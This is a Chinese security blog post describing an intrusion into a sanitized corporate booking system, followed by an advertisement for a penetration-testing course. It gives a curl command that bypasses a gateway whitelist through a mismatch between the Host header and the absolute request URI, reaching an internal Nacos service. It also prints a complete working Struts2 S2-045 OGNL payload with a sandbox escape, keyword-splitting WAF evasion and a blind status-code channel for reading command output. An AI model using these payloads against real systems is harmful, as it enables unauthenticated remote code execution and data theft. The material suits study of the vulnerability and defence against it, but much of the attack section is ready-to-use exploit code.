#  从边缘入口到内网rce  
 进击安全   2026-10-12 01:30  
  
漏洞挖掘本质就是做对抗，也是和系统开发者做攻防，比如开发不让你注册，怎么绕过突破注册，上waf，cdn，反代理，做鉴权这些都是防护方式。怎么绕过突破就是核心点。  
  
脱敏案例，以下代码域名，ip，均为ai生成  
  
目标是跳转sso的会议室预订系统 booking.example-corp.com，hook定位审计js路由，系统js层次无法突破，正面没有东西，值得看的换成入口本身。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GxicA3k2berksVf45DRfgu6zBTGypph4KAJLtmFibCAib4W0zV2fnfNylibfeic6S30l0mFtNFibVAdCkGlauj0bA9b6tCVpz3MMtGMZ5yxXrgjFg/640?wx_fmt=png&from=appmsg "")  
  
前期资产平台信息收集，打开系统资产拓展关联功能，发现兄弟域名解析了一遍，booking-uat.example-corp.com、m.booking、sso.booking，全落在同一个接入集群的几个 IP 上，198.51.100.0 段。入口集中在少数几个 IP，说明前面有一层统一的接入设施。先把这扇门后面的结构摸清楚。  
  
01  
网关绕过  
  
对集群入口做路由探测，扫到 /nacos 路径，网关回了一句。  
  
payload  
```
{"code":403,"msg":"host not registered","upstream":"nacos"}
```  
  
  
回到前期信息收集平台,有nacos域名解析到内网ip  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GxicA3k2berlj7Sns3QUKonhMiclcrG7wBEOW64yHjYkJQBB6nhYRnckRpWSx32nKmRnrP43DK5BFiaHXxcTwD4o0cCvorYCoNXjbh2ibhI8Kpw/640?wx_fmt=png&from=appmsg "")  
  
拒绝发生在网关层，应用层开口只会是 401 登录跳转。判定依据是 Host 头，host not registered 说的就是它，localhost 也一样被拒，分类的依据是字符串形态，与本机无关。IP 字面量永远不会进域名名单，又可能被当成另一类流量。网关要承接健康检查和本机调试，这类流量的 Host 常常就是 IP，实现里很可能给非域名词开了直连分支。固定两个路径，把 Host 挨个换掉打过去。  
  
payload  
```
路径 /nacos      Host=目标域名        403  {"code":403,"msg":"host not registered","upstream":"nacos"}路径 /nacos      Host=localhost       403  同上路径 /nacos      Host=网关域名        403  同上路径 /nacos      Host=0.0.0.0         200  {"servers":[{"ip":"10.0.0.12","port":8848,"state":"UP"},...]}
```  
  
  
前面所有行都 403，只有 Host 等于 0.0.0.0 那一行变成 200，body 是配置中心 nacos 的集群节点列表，内网 IP、端口、节点状态原样吐了回来。说话的是 nacos 本身，请求穿过了网关，落到了后面一个真实的内网服务上。补测 192.0.2.5、169.254.1.1、带端口的 10.0.0.1:80，全部放行，localhost 不行。网关把 Host 为 IP 字面量的请求当内部直连流量放行，域名名单只对域名词生效。  
  
直接对公网入口发 Host: 0.0.0.0 是到不了网关的，接入层按 Host 找虚拟主机，找不到站点，之前试过。这次能到，是因为目标主机信息在请求里存了两份。请求行可以写绝对地址，GET http://booking.example-corp.com/nacos/ HTTP/1.1  
，这是请求行 authority，Host 头里还有一份。RFC 7230 要求两份一致，措辞是 ought to be treated as an error，ought 不是 must，留了两层各读各的空间。实测正是这样，接入层读请求行 authority 路由，网关读 Host 头做白名单。  
  
payload  
```
GET http://booking.example-corp.com/nacos/v1/ns/operator/servers HTTP/1.1Host: 0.0.0.0
```  
  
  
接入层读请求行，authority 是 booking.example-corp.com，合法站点，按站点配置转发给网关。网关读路径，/nacos 命中注册表里的 nacos 服务，再读 Host，0.0.0.0 是 IP 字面量，走直连分支，转发过去。nacos 收到一个没带任何登录态的请求，把集群节点列表原样返回，就是矩阵里那一行。接入层认为这是对合法站点的访问，网关认为这是内部直连，两个判断各自成立，串起来把外网请求送进了内网。  
  
只改 Host、请求行不动，接入层找不到站点，到不了网关。只写绝对 URI、Host 留正常域名，网关按域名白名单拦下，403。两个都改，穿透。  
  
bash  
```
curl -sk --path-as-is \  --request-target "http://booking.example-corp.com/nacos/v1/ns/operator/servers" \  -H "Host: 0.0.0.0" \  https://booking-uat.example-corp.com/
```  
  
  
X-Forwarded-For 伪造内网 IP 也试了，网关不理这个头，三次请求确认后停手。两层都部署了校验，校验依据的却是同一请求的两个不同字段副本，谁也不看对方读的那份。  
  
这就是 Domain Fronting 的变体，host头注入，将host改为0.0.0.0或127.0.0.1，兄弟域名转发集群服务  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GxicA3k2bernABib9XXPHt5N7aRMlLwDKbyUmhfQHiaUrU10Ta1QAshDSPtWqofS6LKXmeoxoloicXTYnbZlyHlKEQZQUibTiaLaVBBeep4dq1N5M/640?wx_fmt=png&from=appmsg "")  
  
访问到了nacos，cve全部测了一遍，居然都修复了，上大字典扫描容易告警且违规，再回到平台把收集到的子域名做fuzz字典，命中率高  
  
02  
锁定目标服务  
  
通过子域名字典扫描到contract-mgmt 路由返回了 200，Tomcat 7 上的登录页，页脚带着 Struts 的痕迹，源码里明晃晃写着一个 action 地址，/contract/flow/entry.action?src=portal  
。Tomcat 7 加 FilterDispatcher 世代的 Struts2，2017 年前后停更的栈，S2-045 那批编号洞的原产地。  
  
03  
验证漏洞  
  
指纹给了方向，洞还要自己验。经典 S2-045 的打法是 Content-Type 头里塞一段 %{...}  
 OGNL，multipart 解析报错时这段表达式会被求值。拿登录页里那个 action 地址直接试，回 500。  
  
500 说明不了什么，一个过载的站也回 500。鉴别实验很便宜。换一个根本不存在的路径，同样的 Content-Type 再打一遍，错误页和真实 action 那份一字节不差。两条路共用同一张错误页，说明报错发生在 Struts 的过滤器阶段，URL 路由还没起作用，表达式就已经被执行了。这就是 S2-045 的行为签名。洞实锤，而且不用挑路径，过滤器范围内打哪都行。  
  
实锤归实锤，经典利用链在这个环境三处走不通。经典打法把命令结果拼进错误页直接回显，这里拿不到响应对象。外层 WAF 对 Content-Type 明文做关键词匹配，原版 exploit 里的词一个都过不去。OGNL 沙箱还挡着 Runtime 的静态调用。  
  
04  
S2-045 求值链  
  
S2-045 编号 CVE-2017-5638，公开分析很多。要把这个环境里还能打的原因讲清楚，得贴着代码走。  
  
请求到达 Struts2 的 Dispatcher，第一步判断是不是文件上传请求。2.3.x 的判定代码大意如下，有删减。  
  
java  
```
// org.apache.struts2.dispatcher.Dispatcher (2.3.x)public HttpServletRequest wrapRequest(HttpServletRequest request) throws IOException {    if (!(request instanceof MultiPartRequestWrapper)) {        if (MultiPartRequest.isMultiformContent(request)) {            request = new MultiPartRequestWrapper(multiPartRequest, request, ...);        }    }    return request;}// MultiPartRequest.isMultiformContentstatic boolean isMultiformContent(HttpServletRequest request) {    String content_type = request.getContentType();    return content_type != null && content_type.contains("multipart/form-data");}
```  
  
  
注意判定用的是 contains  
。Content-Type 头里任何位置出现 multipart/form-data 这几个词，Struts 就认为这是上传请求，开始包装 multipart 处理器。  
  
Struts 自己不解析上传，转交给 commons-fileupload。fileupload 对同一个头的判定是另一套写法。  
  
java  
```
// org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl (1.3.x)FileItemIteratorImpl(RequestContext ctx) throws FileUploadException, IOException {    final String contentType = ctx.getContentType();    if ((null == contentType)        || (!contentType.toLowerCase(Locale.ENGLISH).startsWith(MULTIPART))) {        throw new InvalidContentTypeException(            format("the request doesn't contain a %s or %s stream, content type header is %s",                MULTIPART_FORM_DATA, MULTIPART_MIXED, contentType));   // <-- 注意这里    }    ...}
```  
  
  
一个用 contains，一个用 startsWith。Content-Type 写成 %{...} multipart/form-data  
，前缀是一段 OGNL，后缀带着合法类型词，对 Struts 它是上传请求，被包进 multipart 处理器，对 fileupload 它不以 multipart 开头，直接抛 InvalidContentTypeException。  
  
抛异常本身不危险。危险在 format 字符串的第三个参数，异常消息里把 Content-Type 的原始值完整拼了进去。用户输入就这样进了异常处理管道。  
  
异常冒回 Struts 的 JakartaMultiPartRequest，受影响版本的错误处理大意如下。  
  
java  
```
// org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest (2.3.x, 有删减)public void parse(HttpServletRequest request, String saveDir) throws IOException {    try {        setLocale(request);        processUpload(request, saveDir);    } catch (FileUploadException e) {        String errorMessage = buildErrorMessage(e, new Object[]{});        ...    }}
```  
  
  
buildErrorMessage 一路走到 LocalizedTextUtil.findText，把异常消息当作默认文案传了进去。  
  
java  
```
LocalizedTextUtil.findText(    this.getClass(),"struts.messages.upload.error",    defaultLocale,    e.getMessage(),        // <-- 含 Content-Type 原文的异常消息，作为 defaultMessage 传入    new Object[]{});
```  
  
  
findText 拿 key 去资源文件找本地化文案，找不到就用 defaultMessage。2.3.32 官方补丁改的正是这一带，默认文案参数被换成干净文本。修复位置本身就指认了求值发生在哪里。2.3.x 里这个默认文案会经过 TextParseUtil。  
  
java  
```
// com.opensymphony.xwork2.util.TextParseUtil (2.3.x, 有删减)// 遇到 %{...} 时，把里面的表达式取出Object o = stack.findValue(var);      // <-- %{} 里的内容在这里交给 OGNL 求值// 求值结果 toString 后拼回文本，继续扫下一个 %{}
```  
  
  
stack 是 OgnlValueStack，findValue 底层进 OGNL 引擎。i18n 文案里的 %{...}  
 占位符机制，对异常消息同样生效。Content-Type 里携带的 %{(#p=...)}  
 在"生成一条错误消息"的路上被完整执行了一遍。  
  
整条链合起来。  
  
payload  
```
Content-Type 含 %{...}  → Struts contains 判定通过，包 multipart 处理器    → fileupload startsWith 判定失败      → InvalidContentTypeException，消息拼入 Content-Type 原文        → buildErrorMessage → LocalizedTextUtil.findText(defaultMessage=异常消息)          → TextParseUtil 扫到 %{}            → OgnlValueStack.findValue → OGNL 求值
```  
  
  
这些全都发生在 filter 阶段。multipart 包装比路由到业务方法早，比任何认证检查早。利用不需要任何登录态，URL 只需要落到这个 Struts 应用的过滤器范围里，路径本身可以不存在。实测的报错页堆栈直接落在 filter 阶段，容器错误页把异常位置交代得清清楚楚，正是求值出错的现场。  
  
05  
沙箱逃逸与 WAF 绕过  
  
直接在 %{}  
 里写 @java.lang.Runtime@getRuntime().exec(...)  
 走不通。Struts 2.3.x 后期给 OGNL 求值配了 SecurityMemberAccess，静态方法调用先过 exclude 名单，Runtime 在列。逃逸一行。  
  
java  
```
#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)
```  
  
  
#context  
 是求值时暴露的 OGNL 上下文对象。这行代码换掉的是执行名单检查的策略对象本身。DEFAULT_MEMBER_ACCESS 是 OGNL 自己的默认实现，它不知道 excludedClasses 的存在，名单检查根本不会发生。换完之后静态方法、构造器、反射照常。  
  
然后是 WAF。外层接入层对 Content-Type 明文做关键词匹配，实测拦 java.lang.Class、getRuntime().exec、eval(、带参 exec( 各种形态，连注释和制表符变形都拦。对策两层。  
  
第一层，碎片拼接。OGNL 的字符串相加在运行时完成，把类名和方法名切成几段用 '+' 相连，明文里没有任何连续敏感词，JVM 执行时拼出完整调用。  
  
第二层，嵌套求值。拼好的完整命令链作为一个字符串赋给 #s  
，再用 OGNL 官方 API 对这个字符串再求值一次。  
  
java  
```
#out = @ognl.Ognl@getValue((#s), (#context), (#r))
```  
  
  
Ognl.getValue(expression, context, root)  
 接受字符串表达式。WAF 扫描的是外层结构，命令链在它眼里是一段字符串数据，求值发生在运行时，WAF 够不着。第二个参数传 #context  
，二次求值复用当前上下文，前一步换上的访问策略被完整继承，内层可以放心调用一切。  
  
对 WAF 这件事，我的期待从此都放在提高成本上。它能拦住扫库的脚本，拦不住读过源码的人。目标语言只要有把数据当代码的机制，求值、反序列化、模板、表达式引擎，明文关键词匹配就总有构造空间。  
  
到这里命令已经能跑，这次执行的是 id -un  
，输出被 InputStreamReader 加 BufferedReader 接住，readLine 的结果落进了 #out  
。  
  
然后卡住了。  
  
06  
盲读命令回显  
  
经典 S2-045 有回显，求值结果拼进错误页直接返回。这个环境里没有。逐项试过 getWriter、setHeader、addHeader，全部无效，求值上下文里 ServletActionContext.getResponse()  
 是 null，filter 阶段拿不到响应对象。命令执行了，输出在内存里，出不来。  
  
再看手里已有的行为差异。TextParseUtil 的求值循环里有 catch (Exception e)  
，求值中途抛的任何 Exception 被打日志后吞掉，循环继续，请求照常走完，响应 302。StackOverflowError 是 Error，catch 不住，冒穿 Struts 的过滤器到达容器，响应 500 加错误页。两个状态码，一个干净的 1 bit 通道。  
  
用之前先校准。六组已知命运的表达式打过去，属性不存在、除零、调用不存在的方法、语法错误，全部 302，普通求值错误确实都被吞了。再构造一个必然执行到尾部的表达式，500 出现，错误页 root cause 里是 StackOverflowError。校准通过，500 读作真，302 读作假。剩下的工程问题只有一个，让"任意命题的真假"决定"表达式正常结束还是崩掉"。挂在三元表达式的条件位上就行。  
  
第一步确认输出存在，命题 #out != null  
，回 500。第二步二分长度，#out.length() > 6  
 回 500，> 7  
 回 302，输出 7 个字符。第三步逐字符二分，每个位置用 #out.substring(p, p+1).compareTo('s') >= 0  
，约七次请求定一个字符，七个位置锁定，是应用的服务账号名，脱敏成 svcuser。最后终验 #out == 'svcuser'  
，回 500。链闭合。外网、零认证、一个 HTTPS 请求，命令执行了，输出也读回来了。  
  
成本也顺带算过。一个短输出几十次请求，几分钟。拖文件内容就是请求次数线性放大，没有原理性障碍。这次按约定只跑了取当前用户名的命令，没有上传文件，也没有动数据。  
  
完整 Content-Type 头全文，分段注释。  
  
payload  
```
%{  (#_='multipart/form-data').  (#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).  (#s=('(#p=@java.lan'+'g.Runti'+'me@getRun'+'time().ex'+'ec("id -un")).        (#i=new java.io.InputStreamReader(#p.getInputStream())).        (#b=new java.io.BufferedReader(#i)).        (#b.readLine())')).  (#out=@ognl.Ognl@getValue((#s),(#context),(#r))).  (#f=((#out=='svcuser') ? (#context.setMemberAccess(#nope)) : 0))}
```  
  
  
第一段一个赋值语句，赋的值让整个头的文本里出现 multipart/form-data 几个词，同时满足 Struts 的 contains 判定，又是合法 OGNL，不破坏外层语法。一个头同时过两套判定，一套判进，一套判出，错误路径才会被走到。第二段换访问策略。第三段命令链作为字符串数据，类名、方法名全部切片。第四段嵌套求值，命令执行，输出落进 [#out]()  
。第五段布尔尾，条件为真进崩溃分支，#nope  
 不存在，求值在这条路上反复进入错误处理，最终 StackOverflowError 冒穿所有 catch，容器还 500。条件为假，三元取常数，表达式正常结束，302。崩溃分支的精确机理我没逐帧验证，是从响应形态和框架源码结构推的，实测行为稳定，两个状态码从没串过。  
  
换 whoami 命令再跑一轮，rce 回显判断闭环。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GxicA3k2bermxMZic8mqQUgiaIBzXKM25ONc7C5KG5q4qFrzgkWS51YiaVcnjLnM7S6r470X7Kb00MbhXXGVe8VOQ1otickcMPmV784eiaMh6nZZI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GxicA3k2berlggeR8MriaOR9436bgVUYPmXozOviaFlO1ANtGhibicREnOJ4fK9092KnLGtYYIR6vr993xJW1OOYPhBkr2S66HV95icPehoNrUhIo/640?wx_fmt=png&from=appmsg "")  
  
SSO 鉴权、网关白名单、WAF 关键词、OGNL 沙箱，不出王回显，一层绕了一次。报错里读判定逻辑，矩阵里找放行形态，源码里找求值路径，每次都是绕过突破对抗。  
  
  
广告区：AI+赋能安全第六期课程  
  
渗透方向  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRwzLslDKx6HJHHyS26j1AIFTy3C32lOw18ibzNsBTcsDMK08ybTICWNZSliaxwLbcnzKY8CBCOh4K7bliaK3EeqHM49ucvNyIhN4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQenHzYYrG1LNsQb5zgAK5ahptb1sSLBvUlw8ydDDF9BcBU2rhNcUiaBCQU2rYMaGQcuo2tTIheEJrOwL9rhlhic4CRwgn1mKib6s/640?wx_fmt=png&from=appmsg "")  
  
第六期为AI赋能课程已开始，这里赋能方向暂定，渗透，审计，攻防，占位（最后还没想好），还是一样，一次报名一直可看，包含往期以及最新课程。  
  
但是小朋友一直都是先要说服自己，再去做相关的教学，如果什么都不做，没有一些拿的出来的成果做培训也站不住脚，特别是在AI如此高速迭代的时代背景下。  
  
下面放一些小朋友的成果截图，以及相关的第六期AI课程安排。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRD0q32vRNWD9rV0mOvBvkHGucLVNib2lbicEd9WHiaDEYia07b7f1gLLyAGtwC3icOs5fBqdkEqUFeRgRicNd72xaiaMz0fxmdcV4xxI/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=11 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRX0tIMAIZDHGoj3LTjoebrwicrlg1QY2ptwfq8wsASzUJia18aYt6N60lYPFE2UO85GCY1A6P2ibSaoflNRG3IAXMjm0ljjHicCU0/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=12 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTBhNyJ5OuSyFeshyALRWBia9vRDhmZkwjDWZMtC3gGiaAgnAcOYrR6pKCXmL9Obia81UAicZ8UdGz8XkbTKWvgs5ZoT1KMfQpLGAs/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTkllZemrfy4RNnJiab8IstcYdFdpc7iaUgTRwQibIgZAETOZYJs5FxKLHo637L8NEXAnoyicJeo8DlHfWSm4uGT01zVbqbj9b4Ieg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=14 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRsGe8YMDicpREOjgJe9GkkkkmX4d6PPyklFBkUGF0cmlIgql2gz6oy1dpEiboREVy3F9Go0sMBu5Kx5BicHVkCe9EFiaGIkicNkFCc/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=15 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQPAY46picibLbwmlK0LjDicdUAOxF4ib9DkibicFDmeEschKnQDY6NQ7SfeI8cfNGJqNGb6nv4QA94aANHr1B5t1PWDkUOPFAlRuD8Y/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=16 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kRIkKvF2nLdRLCoJdCybp3FcQOycsV4uhSVElvWCFr2RId0ia0RvjVOC6EA2QVIUGN69obVHLFnObRiaUzTPnqUfzynqSawSDMF4/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=17 "")  
  
这里还有部分相关的没有审核的漏洞就暂时不放出来了兄弟们，漏洞类型其中包含了rce以及sql注入未授权用户接管，APP，和小程序，WEB等都有，但是目前兄弟们也发现了，SRC慢慢的开始也在使用AI对安全方面进行自我消耗，个大SRC陆续关闭暂停，这也是为什么刚开始说做SRC课程最后转变为渗透课程，不仅仅是教大家如何在SRC上用AI漏洞挖掘，同时也是如果在在渗透项目当中降低自己的时间精力成本获得更有质量的交付水准，同期AI攻防目前也在筹备了，这里主要给兄弟们汇报渗透方向。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQv5snr6ROLETs7g04FicD0sNFIQfYFibkPL1a7sjicibFAKTjIEKWM3O9zQHUJ3mPaJg8Zpx6yYFyJEA3p6ibACxickUWjrO6Wia0d7g/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
五、往期课程  
```
```  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQv5snr6ROLETs7g04FicD0sNFIQfYFibkPL1a7sjicibFAKTjIEKWM3O9zQHUJ3mPaJg8Zpx6yYFyJEA3p6ibACxickUWjrO6Wia0d7g/640?wx_fmt=png&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=23 "")  
  
  
